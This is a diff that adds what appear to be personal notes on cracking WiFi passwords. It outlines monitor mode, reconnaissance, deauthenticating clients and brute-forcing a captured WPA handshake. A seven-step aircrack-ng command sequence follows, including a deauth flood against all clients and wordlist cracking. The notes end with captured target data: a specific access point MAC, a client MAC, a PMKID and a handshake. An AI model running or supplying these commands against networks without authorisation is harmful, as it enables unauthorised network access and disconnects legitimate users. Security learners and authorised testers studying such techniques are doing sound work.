@@ -1,0 +1,29 @@
+WiFi hacking approach takes place in five simple steps
+
+    1.The first stage involves configuring the WiFi adapter to set it in monitor mode also called promiscuous mode, with this mode enabled the wifi adapter can capture packets that might or might not be aimed at them.
+    2.The second stage is gathering information on nearby access points. Information such as MAC address, Channel number, Authentication type, and clients/stations connected to a specific access point.
+    3.The third stage is to de-authenticate a client connected to a specific access point so we can capture a four-way handshake. For this step, we need the MAC address of the client and the access point.
+	 We can also perform several other types of attack at this stage such as Fragmentation attack, MAC-spoofing, Man-In-The-Middle attack, Evil twin attack or a dos attack to disable the AP.
+    4.In the fourth stage we finally capture the four-way handshake, this step involves a bit of patience. You may not capture a handshake right away so all you need to do is wait.
+    5.In the final stage, we run a brute force attack against the captured handshake. This is a resource-intensive task and the time is taken may wary depending on the wordlist and CPU speed.
+
+
+WPA Wireless Protected Access protocols are authentication protocols for which a password
+is required. There are 3 iterations of this protocol WPA, WPA2, WPA3
+
+WEP Wireless Equivalent Privacy are different encryption tools used to secure your
+connection, not as safe as WPA.
+
+Step 1: Get rid of conficting processes using Airmon-ng check kill
+Step 2: Start your chosen NIC in monitor mode using airmon-ng start cardname
+Step 3: Check your card is properly configured using iwconfig and checking your card is in monitor mode.
+Step 4: Start Airodump in its most basic mode airodump-ng cardname to scan available networks
+Step 5: Collect the handshake by sniffing your deisired network with airodump by using airodump -c target channel -d target MAC -w filenameforoutput cardname
+Step 6: Deauth the client using aireplay-ng --deauth 0 -a MAC access point cardname ; to deauth all clients
+Step 7: Crack the preshared PSK with aircrack by using aircrack-ng -w path/to/wordlist -b target MAC filenameusedinairodump.cap
+
+Target INFO
+B0:7F:B9:C3:B8:D6  -28       19       14    2   6  195   WPA2 CCMP   PSK  network@2.4
+Client MAC: 00:7C:2D:B2:00:FB
+PMKID found: B0:7F:B9:C3:B8:D6   
+[ WPA handshake: B0:7F:B9:C3:B8:D6  
